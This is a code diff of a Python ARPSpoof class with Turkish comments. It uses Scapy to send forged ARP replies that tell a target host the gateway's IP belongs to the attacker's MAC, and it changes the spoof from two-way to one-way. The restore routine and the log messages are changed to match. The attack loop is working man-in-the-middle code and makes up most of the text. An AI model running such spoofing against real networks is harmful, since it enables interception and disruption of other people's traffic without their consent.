@@ -72,19 +72,13 @@ class ARPSpoof:
                 return
 
             while not stop_event.is_set():
-                # Hedefe sahte ARP paketleri gönder (Gateway IP'sini kendi MAC adresimle eşleştir)
+                # Sadece hedefe sahte ARP paketleri gönder (Gateway IP'sini kendi MAC adresimle eşleştir)
                 arp_to_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=my_mac)
                 ether_to_target = Ether(dst=target_mac)
                 packet_to_target = ether_to_target / arp_to_target
                 sendp(packet_to_target, iface=iface, verbose=0)
 
-                # Gateway'e sahte ARP paketleri gönder (Hedef IP'sini kendi MAC adresimle eşleştir)
-                arp_to_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=my_mac)
-                ether_to_gateway = Ether(dst=gateway_mac)
-                packet_to_gateway = ether_to_gateway / arp_to_gateway
-                sendp(packet_to_gateway, iface=iface, verbose=0)
-
-                app_instance.log_message(f"ARP spoof paketleri gönderildi: {target_ip} ve {gateway_ip}", 'green')
+                app_instance.log_message(f"ARP spoof paketleri gönderildi: {target_ip} -> {gateway_ip}", 'green')
                 time.sleep(2)
         except Exception as e:
             app_instance.log_message(f"ARP Spoofing Hatası ({target_ip}): {e}", 'red')
@@ -106,15 +100,9 @@ class ARPSpoof:
                 packet_to_target = ether_to_target / arp_to_target
                 sendp(packet_to_target, iface=iface, verbose=0)
 
-                # Gateway'e doğru ARP paketleri gönder (Hedef IP'sini gerçek MAC adresiyle eşleştir)
-                arp_to_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=target_mac)
-                ether_to_gateway = Ether(dst=gateway_mac)
-                packet_to_gateway = ether_to_gateway / arp_to_gateway
-                sendp(packet_to_gateway, iface=iface, verbose=0)
-
                 time.sleep(1)  # Paketler arasında bekleme süresi
 
-            app_instance.log_message(f"ARP tabloları geri yüklendi: {target_ip} ve {gateway_ip}", 'green')
+            app_instance.log_message(f"ARP tabloları geri yüklendi: {target_ip} -> {gateway_ip}", 'green')
         except Exception as e:
             app_instance.log_message(f"ARP Geri Yükleme Hatası ({target_ip}): {e}", 'red')
 
